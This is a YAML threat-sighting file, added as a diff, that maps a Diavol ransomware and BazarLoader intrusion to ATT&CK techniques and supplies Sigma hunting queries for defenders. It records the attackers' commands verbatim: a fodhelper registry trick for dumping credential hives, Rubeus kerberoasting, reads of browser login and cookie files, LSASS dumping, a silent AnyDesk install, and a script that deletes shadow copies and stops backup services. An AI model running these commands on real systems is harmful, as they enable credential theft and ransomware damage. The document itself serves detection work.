@@ -1,0 +1,723 @@
+---
+header:
+  sightingReportId: ad6b034f-ef7d-45ac-a863-504e2b2c7eb9
+  status: wip
+  description: Threat Sighting for Diavol Ransomware TTPs based on the report published by @TheDFIRReport.
+  author: Alejandro Houspanossian (@lekz86)
+  acknowledgement: "@TheDFIRReport"
+  tlp: white
+  threatInformation:
+    adversaries:
+    - wizard-spider
+    malware:
+    - Diavol Ransomware
+    - BazarLoader
+    tools:
+    - Invoke-Sharefinder.ps1
+    - Advanced IP Scanner
+    - AnyDesk
+    - CobaltStrike
+    - Email Client
+    - Microsoft msedge
+    - MSSQLUDPScanner.exe
+    - RDP
+    - Rubeus
+    - AdFind
+    - Ipconfig
+    - net
+    - nslookup
+    - onedrive
+    - query
+    - sqlcmd.exe
+    - systeminfo
+    - tasklist
+    - whoami
+    - PowerShell
+    - Task Manager
+    lolbas:
+    - RunDll32
+threatSightings:
+  - sighting: Initial Access - Threat Actor used _Emails_ with malicious hyperlinks to _OneDrive_ for Initial Access.
+    id: a11c0645-37ec-40c9-9d14-266623b32330
+    behaviors:
+    - behavior: _Email_ with malicious hyperlink to _OneDrive_.
+      id: b3c45132-9f1d-408a-a23a-a6d0b4b467ac
+      type: Email Used
+      weapon: email
+      emails:
+      - sender: n/d
+        link: "/onedrive.live[.]com/download?cid=0094E8452D7CDD65&resid=94E8452D7CDD65%21135&authkey=AEN3yDYOia1YdKM"
+      notes:
+      - Connects to /159.223.31[.]75/body/athlete
+      att&ck:
+        initialAccess:
+        - "T1566.002 - Phishing: Spearphishing Link"
+    - behavior: msedge browser created BazarLoader zip file.
+      type: File Created
+      weapon: msedge
+      id: d09488cc-31a3-47b2-abe3-d1ea1f32a651
+      files:
+        - name: new-documents-2005.zip
+          path: 'C:\\Users\\#{user}\\Downloads\new-documents-2005.zip'
+          sha256: n/d
+          process: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+      att&ck:
+        execution:
+        - "T1204.001 - User Execution: Malicious Link"
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+  - sighting: Initial Access - Threat Actor used _zipped .ISO_ files to distribute BazarLoader malware for Defense Evasion.
+    id: c22c0645-1234-40c9-3456-266622b32320
+    behaviors:
+    - behavior: Explorer.exe created _ISO_ file on Temp folder.
+      type: File Created
+      weapon: explorer
+      id: 4a0e573d-99cb-48e5-b66f-ed47131b028d
+      files:
+        - name: new-documents-2005.iso
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Temp\\Temp1_new-documents-2005.zip\\new-documents-2005.iso'
+          sha256: n/d
+          process: "C:\\Windows\\Explorer.exe"
+      notes:
+      - ISO file contained in the zip file
+      - ISO file created on temp folder. Indicates that the user opened the zip file with Explorer.
+      att&ck:
+        defenseEvasion:
+        - "T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass"
+  - sighting: Defense Evasion - Threat Actor used _.LNK_ files in _.ISO_ files to lure users for Execution.
+    id: ba9bc579-4dd8-471e-bb37-2fa3e242d864
+    behaviors:
+    - behavior: _Explorer.exe_ spawned _RunDll32_.
+      id: dec18b41-a41a-4105-a0e2-5003ee94528a
+      type: Process Created
+      weapon: explorer
+      processes:
+      - process: C:\\Windows\\System32\\rundll32.exe
+        cmdLine:
+        - C:\\Windows\\System32\\rundll32.exe SharedFiles.dll, BasicScore
+        parentProcess: C:\\Windows\\Explorer.exe
+      notes:
+      - SharedFiles.dll is included in the ISO file
+      att&ck:
+        execution:
+        - "T1204.002 - User Execution: Malicious File"
+        defenseEvasion:
+        - "T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass"
+  - sighting: Execution - Threat Actor used _RUNDLL32_ to execute _.DLL_ payloads for Defense Evasion.
+    id: 123bc579-4dd8-123e-bb37-2fa3e242d123
+    behaviors:
+    - behavior: _RunDll32_ executed _.DLL.
+      id: 12318b41-a41a-4105-a0e2-5003ee945123
+      type: Process Created
+      weapon: rundll32
+      processes:
+      - process: C:\\Windows\\System32\\rundll32.exe
+        cmdLine:
+        - C:\\Windows\\System32\\rundll32.exe SharedFiles.dll, BasicScore
+        parentProcess: C:\\Windows\\Explorer.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+  - sighting: Defense Evasion - BazarLoader used _BITSadmin_ command-line callbacks for Persistence.
+    id: 221a65c9-7197-4735-bdd7-13697cdfdb99
+    behaviors:
+    - behavior: BITS job executed via _SVCHOST_.
+      id: de6e801f-a357-4228-861c-3f2bbcf745c0
+      type: Process Created
+      weapon: BazarLoader
+      processes:
+      - process: C:\\Windows\\System32\svchost.exe
+        cmdLine:
+        - C:\\Windows\\System32\svchost.exe -k netsvcs -p -s BITS
+    - behavior: _svchost.exe_ spawned _RunDll32_.
+      id: 5a260191-f1b5-4241-ae9e-291b477952e9
+      type: Process Created
+      weapon: BazarLoader
+      processes:
+      - process: C:\\Windows\\System32\\rundll32.exe
+        cmdLine:
+        - rundll32.exe \"D:\\SharedFiles.dll\", BasicScore
+        parentProcess: C:\\Windows\\System32\svchost.exe
+      notes:
+      - the BITS job is designed to fail; attempts to download an unexisting file.
+      - the "bitsadmin /setnotifycmdline" option is used to specify a callback commandline
+      - Name of the BITS job is "Microsoft Office Manager upgrade v24.24"
+      att&ck:
+        persistence:
+        - "T1197 - BITS Jobs"
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+  - sighting: Execution - BazarLoader used a well known set of _net.exe_ and _nltest.exe_ commands for Discovery.
+    id: ee4a48a0-7a0b-4a99-a119-bb88aa5ce75b
+    behaviors:
+    - behavior: Sequence of _net.exe_ and _nltest.exe_ commands.
+      id: ec0f5b2d-a099-4e8c-a5b8-db719ac3ff99
+      type: Process Created
+      weapon: doscmd/batch
+      processes:
+      - process: C:\\Windows\\System32\\net.exe
+        cmdLine:
+        - 'net group /domain admins'
+        - 'net group \"Domain Computers\" /domain'
+        - 'net localgroup administrator'
+        - 'net view /all'
+        - 'nltest /domain_trusts /alltrusts'
+        parentProcess: n/d
+      att&ck:
+        discovery:
+        - "T1069.001 - Permission Groups Discovery: Local Groups"
+        - "T1069.002 - Permission Groups Discovery: Domain Groups"
+        - "T1482 - Domain Trust Discovery"
+        - "T1018 - Remote System Discovery"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Execution - BazarLoader used HTTP protocol to download _Cobalt Strike_ Beacon DLL files for Command And Control.
+    id: c88c3c16-0d69-40b7-9ba0-5cb04020879e
+    behaviors:
+    - behavior: RunDll32 performed network connection to public IPs
+      id: f2cb41b4-717a-4f63-bda8-c2c954b6ad85
+      type: Network Accessed
+      weapon: rundll32
+      connections:
+        - dstIp: 23.81.246[.]32
+          dstPort: 443
+          direction: outbound
+          protocol: tcp
+          dstHost: gawocag[.]com
+          process: C:\\Windows\\System32\\rundll32.exe
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+    - behavior: RunDll32 dropped  malicious _.dll_ files.
+      type: File Created
+      weapon: rundll32
+      id: 8ab2d309-7ba6-460c-8d81-259d3553518b
+      files:
+        - name: tfpkuengdlu.dll
+          path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\tfpkuengdlu.dll
+          sha256: n/d
+          process: "C:\\Windows\\System32\\rundll32.exe"
+        - name: temp.dll
+          path: C:\\ProgramData\\temp.dll
+          sha256: 493a1fbe833c419b37bb345f6f193517d5d9fd2577f09cc74b48b49d7d732a54
+          process: "C:\\Windows\\System32\\rundll32.exe"
+        - name: uvvfvnnswte.dll
+          path: C:\\Users\\#{user}\\AppData\\Local\\Temp\\uvvfvnnswte.dll
+          sha256: 5551fb5702220dfc05e0811b7c91e149c21ec01e8ca210d1602e32dece1e464d
+          process: "C:\\Windows\\System32\\rundll32.exe"
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+  - sighting: Command And Control - Threat Actor used process injection into _Edge browser_ to launch _Cobalt Strike_ post-exploitation tasks for Defense Evasion.
+    id: 1766f964-8f2b-41a0-ba9b-425e49f82d7c
+    behaviors:
+    - behavior: Injected _Edge browser_ spawned _net.exe_ command.
+      id: 7978cc03-05d0-4890-97c6-3d0ec0122ea8
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\System32\\net.exe
+        cmdLine:
+        - 'net view /all'
+        parentProcess: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
+      att&ck:
+        defenseEvasion:
+        - "T1055 - Process Injection"
+        discovery:
+        - "T1018 - Remote System Discovery"
+    - behavior: Injected _Edge browser_ spawned malicious _RunDll32.exe_ executions.
+      id: 65035706-6d9c-49d9-ad44-868cdcca60a8
+      type: Process Created
+      weapon: msedge
+      processes:
+      - process: C:\\Windows\\System32\\rundll32.exe
+        cmdLine:
+        - 'rundll32.exe \"C:\\Users\\#{user}\\AppData\\Local\\Bfzefze\\tfpkuengdlu\" EnterDll'
+        parentProcess: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+        - "T1055 - Process Injection"
+  - sighting: Command And Control - Threat Actor used _Cobalt Strike_ to execute _ipconfig_ and _net user_ commands for Discovery.
+    id: 85ad77aa-ac7c-4fbb-84d2-0a445de56c81
+    behaviors:
+    - behavior: Injected _RunDll32_ spawned _ipconfig.exe_.
+      id: 12032cc1-3a45-481d-883c-f4df670830a0
+      type: Process Created
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\System32\\ipconfig.exe
+        cmdLine:
+        - ipconfig /all
+        parentProcess: C:\\Windows\\System32\\rundll32.exe
+      att&ck:
+        discovery:
+        - "T1018 - Remote System Discovery"
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+    - behavior: Injected _RunDll32_ spawned _net.exe_.
+      id: e7032cc1-3a45-481d-883c-f4df670830a0
+      type: Process Created
+      weapon: net
+      processes:
+      - process: C:\\Windows\\System32\\net.exe
+        cmdLine:
+        - net user USER /domain
+        parentProcess: C:\\Windows\\System32\\rundll32.exe
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+  - sighting: Command And Control - Threat Actor used _Cobalt Strike_ to execute a well-known _AdFind_ recon script for Discovery.
+    id: aaad77aa-ac7c-4fbb-1234-0a445de56cc
+    behaviors:
+    - behavior: Injected _RunDll32_ launched _CMD_ to execute _AdFind_ recon script.
+      type: Process Created
+      id: cc83e9d7-0d87-40b0-b30f-4eeceb6a3356
+      weapon: cobaltstrike
+      processes:
+      - process: C:\\Windows\\system32\\cmd.exe
+        cmdLine:
+        - 'cmd.exe /C adf.bat'
+        parentProcess: C:\\Windows\\system32\\rundll32.exe
+      notes:
+      - Well known script, _adf.bat_
+      att&ck:
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+    - behavior: _CMD_ launched sequence of masqueraded _AdFind.exe_ commands.
+      type: Process Created
+      id: b0601eb5-1062-4ec1-be8b-e62af35c9521
+      weapon: doscmd/batch
+      processes:
+      - process: adfind.exe
+        cmdLine:
+        - 'qq.exe -f \"(objectcategory=person)\"'
+        - 'qq.exe -f \"objectcategory=computer\"'
+        - 'qq.exe -f \"(objectcategory=organizationalUnit)\"'
+        - 'qq.exe -sc trustdmp'
+        - 'qq.exe -subnets -f (objectCategory=subnet)'
+        - 'qq.exe -f \"(objectcategory=group)\"'
+        - 'qq.exe -gcb -sc trustdmp'
+        parentProcess: C:\\Windows\\system32\\cmd.exe
+      notes:
+      - Well known recon script adf.bat
+      - AdFind renamed to qq
+      att&ck:
+        discovery:
+        - "T1016 - System Network Configuration Discovery"
+        - "T1482 - Domain Trust Discovery"
+        defenseEvasion:
+        - "T1036 - Masquerading"
+  - sighting: Command And Control - Threat Actor used a _CMD_ batch script to dump SAM, SECURITY and SYSTEM registry hives via Reg.exe for Credential Access.
+    id: 099db716-c1e4-42c0-87f8-d0e29828e201
+    behaviors:
+    - behavior: Dumped SAM, SECURITY and SYSTEM registry hives using a batch script named 'fodhelper_reg_hashes.bat'.
+      id: 13813f7d-c818-47cc-a9bc-45d3eb0746b7
+      type: Process Created
+      weapon: doscmd/batch
+      processes:
+      - process: C:\\Windows\\System32\\reg.exe
+        cmdLine:
+        - 'reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"reg.exe save hklm\\sam c:\\ProgramData\\sam.save\" /f'
+        - 'reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f fodhelper.exe'
+        - 'reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"reg.exe save hklm\\security c:\\ProgramData\\security.save\" /f'
+        - 'reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f fodhelper.exe'
+        - 'reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"reg.exe save hklm\\system c:\\ProgramData\\system.save\" /f'
+        - 'reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f fodhelper.exe'
+        - 'reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1'
+        parentProcess: C:\\Windows\\System32\\cmd.exe
+      notes:
+      - (using a batch script named fodhelper_reg_hashes.bat)
+      att&ck:
+        defenseEvasion:
+        - "T1003.002 - Security Account Manager"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Command And Control - Threat Actor used _MORE.COM_ command-line tool to access Web Browser internal files for Credential Access.
+    id: 122db716-a1e4-4123-87f8-a0e29828e233
+    behaviors:
+    - behavior: _CMD_ spawned _MORE.COM_ commands to read Web Browser internal files
+      id: b80f01b4-2718-47c8-b44e-cdd21406068f
+      type: Process Created
+      weapon: more
+      processes:
+      - process: C:\\Windows\\System32\\more.com
+        cmdLine:
+        - 'more C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
+        - 'more C:\\Users\\#{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies'
+        - 'more C:\\Users\\#{user}\\AppData\\Local\\Temp\\edge-cookies.json'
+        parentProcess: C:\\Windows\\System32\\cmd.exe
+      notes:
+      - More.com, a.k.k. More Utility file, is part of Microsoft Windows.
+      - More.com allows to read text files.
+      att&ck:
+        defenseEvasion:
+        - "T1555.003 - Credentials from Web Browsers"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Command And Control - Threat Actor used _Rubeus.exe_ for Credential Access.
+    id: 5aef81b8-b2ad-428a-a489-7b9fc1156f6d
+    behaviors:
+    - behavior: _CMD_ spawned _Rubeus_ to output results at ProgramData folder.
+      id: 03593750-0bc5-4786-9869-822a9a6f0a22
+      type: Process Created
+      weapon: rubeus
+      processes:
+      - process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - C:\\Windows\\System32\\cmd.exe /C Rubeus.exe kerberoast /ldapfilter:\'admincount=1\' /format:hashcat /outfile:C:\\ProgramData\\hashes.txt
+        - C:\\Windows\\System32\\cmd.exe /C Rubeus.exe asreproast /format:hashcat /outfile:C:\\ProgramData\\asrephashes.txt
+        parentProcess: C:\\Windows\\System32\\svchost.exe
+      notes:
+      - Rubeus is a C# toolset for raw Kerberos interaction and abuse.
+      att&ck:
+        credentialAccess:
+        - "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting"
+        - "T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Command And Control - Threat Actor used multiple system utilities for Discovery.
+    id: b129959f-c580-44e6-b4a9-2c8114dfdbbb
+    behaviors:
+    - behavior: Performed additional Discovery activity
+      type: Process Created
+      id: b9c75bab-6c0d-4959-9737-e6dec341928a
+      weapon: cmd
+      processes:
+      - process: n/d
+        cmdLine:
+        - 'net group "Domain Admins" /domain'
+        - 'whoami'
+        - 'ipconfig /all'
+        - 'systeminfo'
+        - 'tasklist'
+        - 'net group \"Enterprise admins\" /domain'
+        - 'net localgroup administrators'
+        - 'whoami /all'
+        - 'net use'
+        - 'query user'
+        parentProcess: n/d
+      notes:
+      - multiple commands
+      att&ck:
+        discovery:
+        - "T1016 - System Network Configuration Discovery"
+  - sighting: Command And Control - Threat Actor used _PowerShell_ and _CMD_ to install _AnyDesk_ for Persistence.
+    id: 1da43108-a47c-4408-b71d-e95f19173e93
+    behaviors:
+    - behavior: _PowerShell_ performed network connections.
+      id: 7287dbd3-9d20-4a71-be8f-d455c2673d52
+      type: Network Accessed
+      weapon: powershell
+      connections:
+        - dstIp: n/d
+          dstHost: download.anydesk.com
+          dstPort: 80
+          protocol: TCP
+          direction: outbound
+          process: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+    - behavior: _PowerShell_ downloads _AnyDesk.exe_.
+      type: File Created
+      weapon: anydesk
+      id: 84967c9d-dab0-4852-90d3-1b22a68ca8e5
+      files:
+        - name: AnyDesk.exe
+          path: 'C:\\ProgramData\\AnyDesk.exe'
+          sha256: 4a9dde3979c2343c024c6eeeddff7639be301826dd637c006074e04a1e4e9fe7
+          process: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      att&ck:
+        commandAndControl:
+        - "T1219 - Remote Access Software"
+    - behavior: _PowerShell_ spawned _CMD_ commands to install _AnyDesk.exe_.
+      id: ed0f0152-fdff-48fd-99c7-f496b759b608
+      type: Process Created
+      weapon: anydesk
+      processes:
+      - process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - "cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent"
+        - "cmd.exe /c echo J9kzQ2Y0qO | C:\\ProgramData\\anydesk.exe --set-password"
+        - "cmd.exe /c C:\\ProgramData\\AnyDesk.exe --get-id"
+        parentProcess: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      notes:
+      - The password 'J9kzQ2Y0qO' matches one from the leaked Conti manuals back in August.
+      att&ck:
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Lateral Movement - Threat Actor used _RDP_ to install _FileZilla_ for Exfiltration.
+    id: 42e14687-f289-4e4f-b849-07c2fcb7ea59
+    behaviors:
+    - behavior: Threat Actor installed FileZilla.
+      id: 828af188-4826-4475-9e2a-08990768636c
+      type: Process Created
+      weapon: filezilla
+      processes:
+      - process: "*\\FileZillaPortable.exe"
+        cmdLine:
+        - FileZillaPortable.exe.
+        parentProcess: n/d
+      att&ck:
+        exfiltration:
+        - "T1048 - Exfiltration Over Alternative Protocol"
+        lateralMovement:
+        - "T1021.001 - Remote Services: Remote Desktop Protocol"
+  - sighting: Lateral Movement - Threat Actor used _Task Manager_ to dump LSASS process memory for Credential Access.
+    id: aaaa1234-240a-465c-9a11-e58634464678
+    behaviors:
+    - behavior: _Explorer_ opened _Task Manager_.
+      type: Process Created
+      id: cc5f6a8b-8123-1b14-93b5-2016ef189a12
+      weapon: taskmgr
+      processes:
+      - process: C:\\Windows\\system32\\taskmgr.exe
+        cmdLine:
+        - "\"C:\\Windows\\system32\\taskmgr.exe\" /7"
+        parentProcess: C:\\Windows\\Explorer.exe
+      att&ck:
+        lateralMovement:
+        - "T1021.001 - Remote Services: Remote Desktop Protocol"
+    - behavior: Task Manager accessed LSASS process memory.
+      type: Code Injection
+      id: bc5f6a8b-8123-1b14-93b5-2016ef189a1b
+      weapon: taskmgr
+      injections:
+      - target: C:\\Windows\\System32\\lsass.exe
+        from: C:\\Windows\\system32\\taskmgr.exe
+    - behavior: Dumped LSASS process memory via Task Manager.
+      id: 12d4e5f8-86eb-12fb-80c3-7a21cd2ac1dd
+      type: File Created
+      weapon: taskmgr
+      files:
+        - name: lsass.dmp
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Temp\\lsass.DMP'
+          sha256: n/d
+          process: C:\\Windows\\system32\\taskmgr.exe
+        - name: lsass (2).dmp
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Temp\\lsass (2).DMP'
+          sha256: n/d
+          process: C:\\Windows\\system32\\taskmgr.exe
+      att&ck:
+        credentialAccess:
+        - "T1003.001 - OS Credential Dumping: LSASS Memory"
+  - sighting: Lateral Movement - Threat Actor used _Web browser_ to upload LSASS dump file to Cloud Storage for Exfiltration.
+    id: aabb4687-f289-4e12-b812-07c2fcb7ea12
+    behaviors:
+    - behavior: Uploaded file to Cloud Storage via Web Browser.
+      id: a1aaf188-4826-4333-9e2a-089907686b1b
+      type: DNS Queried
+      weapon: chrome
+      connections:
+      - dstHost: ufile.io
+        direction: outbound
+        protocol: UDP
+        process: "*\\crome.exe"
+      att&ck:
+        exfiltration:
+        - "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+  - sighting: Lateral Movement - Threat Actor used _RDP_ to download and execute portable version of _Advanced_IP_Scanner_ for Discovery.
+    id: abcaf4b4-240a-465c-9e11-e58634464ef2
+    behaviors:
+    - behavior: iexplore.exe performed network connection to public IPs
+      id: 97d4e5f8-86eb-45fb-80c3-7a21cd2ac1ff
+      type: Network Accessed
+      weapon: iexplore
+      connections:
+        - dstIp: 51.89.153.153
+          dstPort: 443
+          protocol: tcp
+          dstHost: download.advanced-ip-scanner[.]com
+          direction: outbound
+          process: C:\\Windows\\iexplore.exe
+      notes:
+      - Advanced_IP_Scanner is a network scanner.
+      att&ck:
+        lateralMovement:
+        - "T1021.001 - Remote Services: Remote Desktop Protocol"
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+    - behavior: iexplore.exe dropped file Advanced_IP_Scanner
+      type: File Created
+      weapon: iexplore
+      id: 88382fa8-7426-40a6-8b09-0cb8a4a023db
+      files:
+        - name: Advanced_IP_Scanner_2.5.3850.exe
+          path: '*\\Downloads\\Advanced_IP_Scanner_2.5.3850.exe'
+          sha256: n/d
+          process: C:\\Windows\\iexplore.exe
+      att&ck:
+        discovery:
+        - "T1105 - Ingress Tool Transfer"
+    - behavior: Executed Advanced_IP_Scanner manually over RDP
+      type: Process Created
+      id: aa5f6a8b-8b61-1b1c-93b5-2016ef189acc
+      weapon: advanced_ip_scanner
+      processes:
+      - process: Advanced_IP_Scanner_2.5.3850.exe
+        cmdLine:
+        - n/d
+        parentProcess: C:\\Windows\\Explorer.exe
+      att&ck:
+        discovery:
+        - "T1046 - Network Service Scanning"
+        lateralMovement:
+        - "T1021.001 - Remote Services: Remote Desktop Protocol"
+  - sighting: Lateral Movement - Threat Actor used _MSSQLUDPScanner.exe_ MSSQL tool for Discovery.
+    id: ce1af4b4-240a-465c-9e11-e58634464ef6
+    behaviors:
+    - behavior: Executed MSSQLUDPScanner.exe
+      type: Process Created
+      weapon: MSSQLUDPScanner
+      id: f35f6a8b-8b64-4b5c-93b5-8006ef189a64
+      processes:
+      - process: MSSQLUDPScanner.exe
+        cmdLine:
+        - 'MSSQLUDPScanner.exe --cdir #{range}'
+        parentProcess: n/d
+      notes:
+      - MSSQLUDPScanner.exe is an offensive tool
+      - Likely https://github[.]com/rvrsh3ll/MSSQLUDPScanner
+      - Likely executed via Cobalt Strike
+      att&ck:
+        discovery:
+        - "T1046 - Network Service Scanning"
+  - sighting: Execution - Threat Actor used well known batch file -_kill.bat_- to inhibit system recovery for Impact.
+    id: 6eaeb712-4a64-495c-8b50-dcc9b9b6760c
+    behaviors:
+    - behavior: _CMD_ executed batch script named _kill.bat_.
+      id: 66b94202-0480-41fc-998e-3927cb8453d3
+      type: Process Created
+      weapon: doscmd/batch
+      processes:
+      - process: C:\\Windows\\System32\\cmd.exe
+        cmdLine:
+        - sc  config \"Netbackup Legacy Network service\" start= disabled
+        - bcdedit  /set {default}
+        - bcdedit  /set {default} recoveryenabled No
+        - vssadmin.exe  Delete Shadows /all /quiet
+        - wmic.exe  Shadowcopy Delete
+        - net  stop \"Zoolz 2 Service\" /y
+        - net  stop \"Veeam Backup Catalog Data Service\" /y
+        - net  stop \"Symantec System Recovery\" /y
+        - net  stop \"SQLsafe Filter Service\" /y
+        - net  stop \"SQLsafe Backup Service\" /y
+        - net  stop \"SQL Backups\" /y
+        - net  stop \"Acronis VSS Provider\" /y
+        - net  stop VeeamDeploySvc /y
+        - net  stop BackupExecVSSProvider /y
+        - net  stop BackupExecRPCService /y
+        - net  stop BackupExecManagementService /y
+        - net  stop BackupExecJobEngine /y
+        - net  stop BackupExecDeviceMediaService /y
+        parentProcess: n/d
+      att&ck:
+        defenseEvasion:
+        - "T1562.001 - Impair Defenses: Disable or Modify Tools"
+        impact:
+        - "T1490 - Inhibit System Recovery"
+  - sighting: Execution - Threat Actor used _RDP_ to execute Diavol Ransomware binary manually on targets for Impact.
+    id: f17f895a-b61a-42cc-8769-f76218d8c620
+    behaviors:
+    - behavior: _Explorer.exe_ launched ransomware.
+      id: f14030f9-5057-4d60-a5c5-6d38bbd77cac
+      type: Process Created
+      weapon: adhoc-malware
+      processes:
+      - process: C:\\ProgramData\\CryptoLocker64.exe
+        cmdLine:
+        - C:\\ProgramData\\CryptoLocker64.exe.
+        parentProcess: C:\\Windows\\Explorer.exe
+      att&ck:
+        impact:
+        - "T1486 - Data Encrypted for Impact"
+        - "T1491.001 - Defacement: Internal Defacement"
+        lateralMovement:
+        - "T1021.001 - Remote Services: Remote Desktop Protocol"
+threatHunting:
+  - query: Hunt for suspicious .ISO file created out of zip files
+    queryId: c279842b-b971-4a50-a3cc-30f5b8b530d4
+    type: sigma
+    behaviorIds:
+    - 4a0e573d-99cb-48e5-b66f-ed47131b028d
+    logsource:
+      category: file_creation
+      product: windows
+    detection:
+      selection:
+          Image|endswith: '\\Explorer.exe'
+          TargetFilename|endswith: '.iso'
+          TargetFilename|re: '*Temp1_*.zip\\*.iso'
+      condition: selection
+  - query: Hunt BITS job callback commands
+    queryId: 253c361d-a8b5-4295-aaf9-7501a74ea304
+    type: sigma
+    behaviorIds:
+    - de6e801f-a357-4228-861c-3f2bbcf745c0
+    - 5a260191-f1b5-4241-ae9e-291b477952e9
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      bitsjob:
+          ParentImage|endswith:
+              - '\\svchost.exe'
+          ParentCommandLine|contains:
+              - '-k netsvcs -p -s BITS'
+      child:
+          Image|endswith:
+              - '\\RunDll32.exe'
+              - '\\powershell.exe'
+      condition: all of them
+  - query: Hunt for suspicious AnyDesk installations
+    queryId: 2f81934d-5fbc-4e35-8593-cf4920d5372d
+    type: sigma
+    behaviorIds:
+    - ed0f0152-fdff-48fd-99c7-f496b759b608
+    logsource:
+      category: file_creation
+      product: windows
+    detection:
+      selection:
+          Image|endswith: '\\powershell.exe'
+          TargetFilename|endswith: 'AnyDesk.exe'
+      condition: selection
+  - query: Hunt for well known AdFind.exe commands
+    queryId: 96702a6e-3a87-4736-81e9-c718cc31bd0a
+    type: sigma
+    behaviorIds:
+    - b0601eb5-1062-4ec1-be8b-e62af35c9521
+    logsource:
+      category: process_creation
+      product: windows
+    detection:
+      selection:
+          ParentImage|endswith: '\\cmd.exe'
+          CommandLine|contains:
+            - 'objectcategory=person'
+            - 'objectcategory=computer'
+            - 'objectcategory=organizationalUnit'
+            - '-sc trustdmp'
+            - 'objectcategory=group'
+            - 'objectCategory=subnet'
+            - '-gcb -sc trustdmp'
+      condition: selection
+footer:
+  changeTracking:
+    created: 2021-01-31
+    lastModified: 2021-03-17
+    sightingVersion: 1.1
+    schemaVersion: 1.7
+  references:
+    - https://thedfirreport.com/2021/12/13/diavol-ransomware/
+    - https://www.ic3.gov/Media/News/2022/220120.pdf
+    - https://www.scythe.io/library/adversary-emulation-diavol-ransomware-threatthursday
